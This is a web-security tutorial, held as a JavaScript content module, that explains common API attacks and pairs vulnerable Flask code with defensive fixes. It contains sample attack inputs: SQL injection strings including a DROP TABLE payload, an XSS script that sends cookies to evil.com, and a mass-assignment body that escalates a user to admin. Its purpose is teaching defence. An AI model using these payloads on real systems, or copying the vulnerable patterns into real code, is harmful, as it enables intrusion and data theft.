export const CONTENT = `
      <p>Your API is your attack surface. Every endpoint you expose is a door that attackers will try to open. In 2025, API attacks increased by 681% (Salt Security report). This guide shows you <strong>exactly how hackers attack APIs</strong> and how to defend against each attack — with real exploit examples and defense code.</p>

      <h2>The Top API Attack Vectors</h2>

      <!-- Attack Overview -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Top 10 API Attack Vectors (OWASP API Security Top 10)</div>
        <div class="timeline">
          <div class="timeline-item" style="--c:#ef4444"><div class="timeline-item-title" style="color:#ef4444">1. Broken Object-Level Authorization (BOLA)</div><div class="timeline-item-desc">Access other users' data by changing IDs in the URL</div></div>
          <div class="timeline-item" style="--c:#f97316"><div class="timeline-item-title" style="color:#f97316">2. Broken Authentication</div><div class="timeline-item-desc">Weak tokens, no expiry, credential stuffing</div></div>
          <div class="timeline-item" style="--c:#a855f7"><div class="timeline-item-title" style="color:#a855f7">3. SQL Injection</div><div class="timeline-item-desc">Inject SQL through input fields to read/modify database</div></div>
          <div class="timeline-item" style="--c:#3b82f6"><div class="timeline-item-title" style="color:#3b82f6">4. Cross-Site Scripting (XSS)</div><div class="timeline-item-desc">Inject JavaScript that executes in other users' browsers</div></div>
          <div class="timeline-item" style="--c:#22c55e"><div class="timeline-item-title" style="color:#22c55e">5. Rate Limit Bypass</div><div class="timeline-item-desc">Overwhelm the API with requests (brute force, DDoS)</div></div>
          <div class="timeline-item" style="--c:#ec4899"><div class="timeline-item-title" style="color:#ec4899">6. CORS Misconfiguration</div><div class="timeline-item-desc">Allow unauthorized domains to make API requests</div></div>
          <div class="timeline-item" style="--c:#7c3aed"><div class="timeline-item-title" style="color:#7c3aed">7. Mass Assignment</div><div class="timeline-item-desc">Send extra fields to elevate privileges (role: admin)</div></div>
        </div>
      </div>

      <h2>1. SQL Injection — The Classic Database Attack</h2>
      <p><strong>How the attacker thinks:</strong> "If I put SQL code in this input field, will the server execute it?"</p>

      <pre><code># &#x274C; VULNERABLE: String concatenation in SQL
@app.route("/api/users")
def get_users():
    search = request.args.get("search", "")
    # Attacker sends: search=' OR '1'='1
    query = f"SELECT * FROM users WHERE name = '{search}'"
    # Becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
    # Returns ALL users! The attacker now has your entire user database.
    results = db.execute(query)
    return jsonify(results)

# Even worse — the attacker can MODIFY data:
# search='; DROP TABLE users; --
# Becomes: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
# Your users table is gone.</code></pre>

      <pre><code># &#x2705; DEFENSE: Parameterized queries (ALWAYS)
@app.route("/api/users")
def get_users():
    search = request.args.get("search", "")
    # Parameters are NEVER executed as SQL — they're treated as data
    query = "SELECT * FROM users WHERE name = ?"
    results = db.execute(query, (search,))
    return jsonify(results)

# With an ORM (even safer — no raw SQL at all):
users = User.query.filter(User.name.ilike(f"%{search}%")).all()

# Defense checklist:
# 1. NEVER use f-strings or .format() in SQL queries
# 2. ALWAYS use parameterized queries or ORM methods
# 3. Use least-privilege database users (read-only for read endpoints)
# 4. Enable WAF (Web Application Firewall) to block common SQLi patterns</code></pre>

      <h2>2. Broken Object-Level Authorization (BOLA/IDOR)</h2>
      <p><strong>How the attacker thinks:</strong> "If I change the user ID in the URL from my ID to someone else's, will the API let me see their data?"</p>

      <pre><code># &#x274C; VULNERABLE: No ownership check
@app.route("/api/orders/&lt;order_id&gt;")
@login_required
def get_order(order_id):
    # Attacker is user 5, but requests /api/orders/999 (user 3's order)
    order = Order.query.get(order_id)
    return jsonify(order.to_dict())
    # Returns user 3's order! No check if the requester owns it.

# &#x2705; DEFENSE: Always verify ownership
@app.route("/api/orders/&lt;order_id&gt;")
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({"error": "Not found"}), 404
    # CRITICAL: Check ownership
    if order.user_id != current_user.id:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(order.to_dict())

# Better: Always filter by user at the query level
@app.route("/api/orders/&lt;order_id&gt;")
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id  # Can ONLY see own orders
    ).first_or_404()
    return jsonify(order.to_dict())</code></pre>

      <h2>3. Cross-Site Scripting (XSS)</h2>
      <p><strong>How the attacker thinks:</strong> "If I submit JavaScript as my username, will it execute when other users view my profile?"</p>

      <pre><code># &#x274C; VULNERABLE: Unescaped output
# Attacker sets their name to: &lt;script&gt;fetch('https://evil.com/?cookie='+document.cookie)&lt;/script&gt;
# When any user views the attacker's profile, their cookies are stolen!

# &#x2705; DEFENSE: Multiple layers

# Layer 1: Escape all output (frameworks do this by default)
# Angular: Safe by default — [innerHTML] is sanitized
# React: Safe by default — JSX escapes values
# Django: {{ value }} auto-escapes HTML
# NEVER use: [innerHTML]="untrustedData" or dangerouslySetInnerHTML

# Layer 2: Content-Security-Policy header
# Prevents inline scripts from executing even if injected
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'

# Layer 3: HttpOnly cookies (can't be read by JavaScript)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

# Layer 4: Input validation
def sanitize_input(text):
    """Strip HTML tags from user input."""
    import bleach
    return bleach.clean(text, tags=[], strip=True)</code></pre>

      <h2>4. Rate Limiting — Stop Brute Force &amp; DDoS</h2>
      <p><strong>How the attacker thinks:</strong> "If there's no rate limit, I can try 10,000 passwords per second on the login endpoint."</p>

      <!-- Rate Limit Strategies -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Rate Limiting Strategies</div>
        <div class="vs-cards" style="grid-template-columns:1fr 1fr">
          <div class="vs-card" style="border-color:#3b82f6">
            <div class="vs-card-header" style="background:#3b82f6">Application-Level</div>
            <div class="vs-card-body">
              <div class="vs-row"><span class="vs-row-icon">&#x1F510;</span>Login: 5 attempts / 15 min</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4E1;</span>API: 100 requests / min / user</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F50D;</span>Search: 30 queries / min</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4E7;</span>Password reset: 3 / hour</div>
            </div>
          </div>
          <div class="vs-card" style="border-color:#22c55e">
            <div class="vs-card-header" style="background:#22c55e">Infrastructure-Level</div>
            <div class="vs-card-body">
              <div class="vs-row"><span class="vs-row-icon">&#x1F6E1;</span>WAF: Block known attack patterns</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F310;</span>CDN: Absorb DDoS at the edge</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F512;</span>IP rate limit: 1000 req/min/IP</div>
              <div class="vs-row"><span class="vs-row-icon">&#x26A0;</span>Geo-blocking: Block suspicious regions</div>
            </div>
          </div>
        </div>
      </div>

      <pre><code># Python: Rate limiting with Flask-Limiter
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379",  # Use Redis for distributed rate limiting
)

# Strict limit on login
@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("5 per 15 minutes")
def login():
    # After 5 failed attempts, return 429 Too Many Requests
    pass

# Different limits per endpoint
@app.route("/api/search")
@limiter.limit("30 per minute")
def search():
    pass

# nginx rate limiting (infrastructure level):
# limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
# location /api/ {
#     limit_req zone=api burst=20 nodelay;
#     limit_req_status 429;
# }

# Return proper headers so clients know the limits:
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 43
# X-RateLimit-Reset: 1712345678
# Retry-After: 30</code></pre>

      <h2>5. CORS Misconfiguration</h2>
      <p><strong>How the attacker thinks:</strong> "If the API allows any origin, I can make requests from my malicious website using the victim's cookies."</p>

      <pre><code># &#x274C; VULNERABLE: Allow all origins
from flask_cors import CORS
CORS(app, origins="*", supports_credentials=True)
# ANY website can now make authenticated requests to your API!
# Attacker creates evil.com with JavaScript that calls your API
# using the victim's cookies. The API happily responds.

# &#x2705; DEFENSE: Whitelist specific origins
CORS(app, origins=[
    "https://app.example.com",
    "https://admin.example.com",
], supports_credentials=True)

# nginx CORS headers (manual control):
# add_header Access-Control-Allow-Origin "https://app.example.com" always;
# add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE" always;
# add_header Access-Control-Allow-Headers "Authorization, Content-Type" always;
# add_header Access-Control-Allow-Credentials "true" always;

# CORS rules:
# 1. NEVER use origins="*" with credentials=True
# 2. Whitelist only YOUR frontend domains
# 3. Don't reflect the Origin header back (common misconfiguration)
# 4. Restrict allowed methods (don't allow DELETE if not needed)</code></pre>

      <h2>6. Mass Assignment / Over-Posting</h2>
      <p><strong>How the attacker thinks:</strong> "What if I add extra fields to the request body that I'm not supposed to set?"</p>

      <pre><code># &#x274C; VULNERABLE: Accept all fields from request
@app.route("/api/users/me", methods=["PATCH"])
@login_required
def update_profile():
    data = request.json
    # Attacker sends: {"name": "Hacker", "role": "admin", "is_verified": true}
    for key, value in data.items():
        setattr(current_user, key, value)  # Sets EVERYTHING including role!
    db.session.commit()
    return jsonify(current_user.to_dict())

# &#x2705; DEFENSE: Explicit allowlist of updatable fields
ALLOWED_FIELDS = {"name", "email", "avatar_url", "bio"}

@app.route("/api/users/me", methods=["PATCH"])
@login_required
def update_profile():
    data = request.json
    for key, value in data.items():
        if key in ALLOWED_FIELDS:  # Only allow safe fields
            setattr(current_user, key, value)
        # "role", "is_admin", "is_verified" are silently ignored
    db.session.commit()
    return jsonify(current_user.to_dict())

# Even better: Use Pydantic/Marshmallow schemas
from pydantic import BaseModel

class UpdateProfileRequest(BaseModel):
    name: str | None = None
    email: str | None = None
    bio: str | None = None
    # role, is_admin NOT in schema = impossible to set</code></pre>

      <h2>7. Security Headers — The Free Defense Layer</h2>
      <pre><code># Every API response should include these headers:

# nginx configuration:
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "0" always;  # Disabled — use CSP instead
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

# Python (Flask middleware):
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=63072000'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response</code></pre>

      <h2>8. API Authentication Hardening</h2>
      <pre><code># JWT Best Practices:

# 1. Short-lived access tokens (15 min)
# 2. Refresh tokens stored in HttpOnly cookies (not localStorage!)
# 3. Token rotation — new refresh token on each use
# 4. Revocation — maintain a blocklist for compromised tokens

# &#x274C; BAD: Long-lived token in localStorage
localStorage.setItem('token', jwt)
// XSS can steal this token!

# &#x2705; GOOD: HttpOnly cookie (JavaScript can't access it)
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=900

# Password rules:
# - Minimum 12 characters
# - Check against breached password databases (HaveIBeenPwned API)
# - bcrypt or Argon2 for hashing (NEVER SHA-256)
# - Account lockout after 5 failed attempts (with exponential backoff)</code></pre>

      <h2>9. WAF (Web Application Firewall)</h2>
      <p>A WAF sits between the internet and your API, blocking common attacks before they reach your code:</p>

      <!-- WAF Pipeline -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">WAF: Defense in Depth</div>
        <div class="pipeline">
          <div class="pipeline-step" style="background:#ef4444;--i:0"><span class="pipeline-step-icon">&#x1F47E;</span>Attacker<span class="pipeline-step-sub">Malicious request</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#f97316;--i:1"><span class="pipeline-step-icon">&#x1F6E1;</span>CDN<span class="pipeline-step-sub">DDoS protection</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#7c3aed;--i:2"><span class="pipeline-step-icon">&#x1F512;</span>WAF<span class="pipeline-step-sub">Block SQLi, XSS, bots</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#3b82f6;--i:3"><span class="pipeline-step-icon">&#x23F1;</span>Rate Limiter<span class="pipeline-step-sub">Throttle abuse</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#22c55e;--i:4"><span class="pipeline-step-icon">&#x2705;</span>Your API<span class="pipeline-step-sub">Clean traffic only</span></div>
        </div>
      </div>

      <pre><code># AWS WAF rules example:
# 1. Block SQL injection patterns (AWS managed rule)
# 2. Block known bad IPs (AWS IP reputation list)
# 3. Block requests with no User-Agent
# 4. Rate limit: 2000 requests/5min per IP
# 5. Geo-block countries you don't serve
# 6. Block requests larger than 8KB to login endpoints

# Cloudflare WAF (simpler setup):
# - Enable "OWASP Core Rule Set" (blocks top 10 attacks)
# - Enable "Bot Fight Mode"
# - Set rate limiting rules per endpoint
# - Enable "Under Attack Mode" during DDoS</code></pre>

      <h2>Complete API Security Checklist</h2>

      <!-- Security Checklist -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">API Security Checklist</div>
        <div style="overflow-x:auto">
          <table style="width:100%;border-collapse:collapse;font-size:0.78rem;min-width:500px">
            <thead>
              <tr>
                <th style="text-align:left;padding:0.6rem;background:#ef4444;color:#fff;border-radius:0.4rem 0 0 0">Category</th>
                <th style="text-align:left;padding:0.6rem;background:#ef4444;color:#fff">Defense</th>
                <th style="text-align:center;padding:0.6rem;background:#ef4444;color:#fff;border-radius:0 0.4rem 0 0">Priority</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Authentication</td><td style="padding:0.5rem">Short-lived JWTs, HttpOnly cookies, MFA, bcrypt/Argon2</td><td style="padding:0.5rem;text-align:center;color:#ef4444;font-weight:700">Critical</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Authorization</td><td style="padding:0.5rem">Check ownership on every endpoint, RBAC, no BOLA/IDOR</td><td style="padding:0.5rem;text-align:center;color:#ef4444;font-weight:700">Critical</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Input Validation</td><td style="padding:0.5rem">Parameterized SQL, Pydantic schemas, sanitize all input</td><td style="padding:0.5rem;text-align:center;color:#ef4444;font-weight:700">Critical</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Rate Limiting</td><td style="padding:0.5rem">Per-user and per-IP limits, stricter on auth endpoints</td><td style="padding:0.5rem;text-align:center;color:#f97316;font-weight:700">High</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">CORS</td><td style="padding:0.5rem">Whitelist origins, no wildcard with credentials</td><td style="padding:0.5rem;text-align:center;color:#f97316;font-weight:700">High</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Security Headers</td><td style="padding:0.5rem">HSTS, CSP, X-Content-Type-Options, X-Frame-Options</td><td style="padding:0.5rem;text-align:center;color:#f97316;font-weight:700">High</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">TLS</td><td style="padding:0.5rem">HTTPS everywhere, TLS 1.2+ minimum, HSTS preload</td><td style="padding:0.5rem;text-align:center;color:#ef4444;font-weight:700">Critical</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">WAF</td><td style="padding:0.5rem">AWS WAF, Cloudflare, or ModSecurity with OWASP rules</td><td style="padding:0.5rem;text-align:center;color:#f97316;font-weight:700">High</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Logging</td><td style="padding:0.5rem">Log all auth events, failed requests, unusual patterns</td><td style="padding:0.5rem;text-align:center;color:#3b82f6;font-weight:700">Medium</td></tr>
              <tr><td style="padding:0.5rem;color:var(--foreground);font-weight:700">Dependency Scanning</td><td style="padding:0.5rem">Snyk/Dependabot in CI, patch critical CVEs within 24h</td><td style="padding:0.5rem;text-align:center;color:#3b82f6;font-weight:700">Medium</td></tr>
            </tbody>
          </table>
        </div>
      </div>

      <p>API security is not a feature you add at the end — it's a practice you embed from day one. The attacks in this guide are not theoretical — they happen every day to real APIs. Start with the critical items: parameterized queries, ownership checks, rate limiting, and proper authentication. Then layer on WAF, security headers, and monitoring. Every defense you add makes the attacker's job exponentially harder.</p>
    `;
